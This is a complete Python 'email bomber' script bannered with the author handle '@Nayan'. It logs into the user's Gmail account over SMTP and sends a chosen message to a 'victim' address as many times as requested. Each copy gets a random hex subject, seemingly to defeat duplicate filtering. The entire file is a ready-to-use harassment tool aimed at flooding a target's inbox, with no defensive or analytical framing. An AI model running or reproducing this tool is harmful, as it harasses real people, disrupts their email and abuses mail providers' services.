import os
import random
import smtplib
import sys
import getpass
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Clear screen (for Unix-like systems)
os.system('clear')

print('''
███████╗███╗   ███╗ █████╗ ██╗██╗         ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
█████╗  ██╔████╔██║███████║██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                            By \033[93m@Nayan\033[97m
''')
print(" ")

# User information
user = input('\033[94m[?] \033[97mYour \033[92mGmail\033[97m: \033[93m')
passworde = getpass.getpass('\033[94m[?]\033[97m Your \033[91mPassword\033[97m: \033[93m')
print(" ")
victim = input('\033[94m[?]\033[97m The victim \033[91mEMAIL\033[97m: \033[93m')
message_body = input('\033[94m[?]\033[97m Your \033[92mMessage\033[97m: \033[93m')
print(" ")
num_send = int(input('\033[94m[?] \033[97mNumber of \033[92msend\033[97m: \033[93m'))
print(" ")
print("\033[94m[*] \033[97mSending: ")

# SMTP server info
smtp_server = 'smtp.gmail.com'
port = 587

try:
    # Create SMTP session
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls()
        server.ehlo()
        
        # Login
        server.login(user, passworde)
        
        # Send emails
        for i in range(1, num_send + 1):
            subject = os.urandom(9).hex()
            msg = MIMEMultipart()
            msg['From'] = user
            msg['To'] = victim
            msg['Subject'] = subject

            msg.attach(MIMEText(message_body, 'plain'))

            server.sendmail(user, victim, msg.as_string())
            print(f"\033[94m[✔]\033[97m Email \033[92mSENT\033[97m: \033[93m{i}")
            sys.stdout.flush()
        
        print('\033[93m[✔]\033[97m All messages were \033[92msent\033[97m')

except KeyboardInterrupt:
    print('[✘] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m[✘] \033[91mError \033[97m:")
    print('\033[94m[✘] \033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
    print("\033[94m[!] \033[97mCheck if the option of 'Less secure app access' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
    sys.exit()
